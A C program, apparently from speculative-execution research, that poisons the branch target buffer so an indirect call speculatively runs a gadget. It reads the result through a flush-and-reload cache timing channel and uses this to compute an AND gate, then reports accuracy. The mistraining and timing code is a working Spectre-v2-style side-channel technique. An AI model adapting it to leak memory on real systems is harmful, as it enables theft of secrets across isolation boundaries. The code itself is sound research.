#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <x86intrin.h>

#define CACHE_HIT_THRESHOLD 80
#define ITERATIONS 1000000
#define mix_i 65 // < 256
#define GAP (512)

uint8_t channel[256 * GAP]; // side channel to extract secret phrase
uint64_t *target; // pointer to indirect call target
uint8_t array_in1[256 * GAP];
uint8_t array_in2[256 * GAP];

// mistrained target of indirect call
int gadget(uint8_t *addr1, uint8_t *addr2)
{
    return channel[addr1[addr2[0]] * GAP]; // speculative loads fetch data into the cache
}
int safe_target() { return 0; }

// function that makes indirect call
// note that addr will be passed to gadget via %rdi
int victim(uint8_t *addr1, uint8_t *addr2, int input)
{
    int junk = 0;
    // set up branch history buffer (bhb) by performing >29 taken branches
    // see https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html
    //   for details about how the branch prediction mechanism works
    // junk and input used to guarantee the loop is actually run
    for (int i = 1; i <= 100; i++) {
        input += i;
        junk += input & i;
    }

    int result;
    // call *target
    __asm volatile(
        "callq *%1\n"
        "mov %%eax, %0\n"
        : "=r" (result)
        : "r" (*target)
        : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11"
    );
    return result & junk;
}

int readByte(uint8_t *addr1, uint8_t *addr2, int input)
{
    int j, junk = 0;
    uint64_t start, elapsed;
    uint8_t *addr;
    uint8_t dummyChar = 0;

    // poison branch target predictor
    *target = (uint64_t)&gadget;
    _mm_mfence();
    for (j = 10; j > 0; j--) {
        junk ^= victim(&dummyChar, &dummyChar, 0);
    }
    _mm_mfence();

    // flush side channel
    _mm_clflush(&channel[mix_i * GAP]);
    // change to safe target
    *target = (uint64_t)&safe_target;
    _mm_mfence();

    // flush target to prolong misprediction interval
    junk ^= array_in1[4096 - ((input & 1) << 12)];
    junk ^= array_in2[4096 - ((input & 2) << 11)];
    _mm_clflush(&array_in1[(input & 1) << 12]);
    _mm_clflush(&array_in2[(input & 2) << 11]);
    _mm_clflush((void*) target);
    _mm_mfence();

    // call victim
    junk ^= victim(addr1, addr2, 0);
    _mm_mfence();

    // now, the value of *addr_to_read should be cached even though
    // the logical execution path never calls gadget()

    // time reads, mix up order to prevent stride prediction
    addr = &channel[mix_i * GAP];
    start = __rdtscp(& junk);
    junk ^= *addr;
    elapsed = __rdtscp(& junk) - start;
    if (elapsed <= CACHE_HIT_THRESHOLD)
      return mix_i;
    return -1;
}

int main() {
    target = (uint64_t*)malloc(sizeof(uint64_t));
    array_in1[0] = mix_i;
    array_in2[0] = 0;
    
    for (int i = 0; i < (int)sizeof(channel); i++) {
        channel[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
    }

    int correct = 0;
    clock_t end_t, start_t = clock();

    for (int seed = 0; seed < ITERATIONS; seed++) {
        int got = readByte(array_in1, array_in2, seed);
        if ((got == mix_i) == ((seed & 3) == 3)) correct++;
    }
    end_t = clock();

    printf("=== AND gate (Branch target buffer) ===\n");
    printf("Correct rate: %.2f%%\n", 100 * ((double)correct / ITERATIONS));
    printf("Time usage: %.3fs ", (double)(end_t - start_t) / CLOCKS_PER_SEC);
    printf("over %d iterations.\n", ITERATIONS);

    free(target);
    return 0;
}
